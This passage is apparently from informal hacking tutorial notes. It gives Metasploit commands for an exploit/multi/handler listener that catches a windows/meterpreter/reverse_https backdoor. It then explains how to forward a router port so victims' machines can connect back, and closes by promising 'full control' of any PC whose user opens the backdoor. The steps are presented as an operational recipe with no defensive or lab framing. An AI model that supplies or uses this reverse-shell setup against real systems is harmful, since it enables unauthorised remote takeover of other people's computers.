cause we are using reverse connection, we need to open a port in our computer to listen.
first run metasploit by this command,
msfconsole

now use this command which allow us to listen to incoming connections
use exploit/multi/handler

now we need to set the options we have set when we created the backdoor
for example:

show options
set PAYLOAD windows/meterpreter/reverse_https
set LHOST ip
set LPORT X
exploit

If we are using public ip, the information will be sent to our router on the port that we set before,
The router doesnt know where this inforamtion should be sent. To fix that we need to tell the router to send
us the information on port X. 
We can do it by going to the router page, login to the router page.
Look for ip forwarding we need to set a new rule, Set the port X, and the ip - kali ip machine. Now save, and whenever the router get 
a request on port X it will forward that request to kali machine.

Now if anyone opens the backdoor, then it will connect to the pc and you will have full control
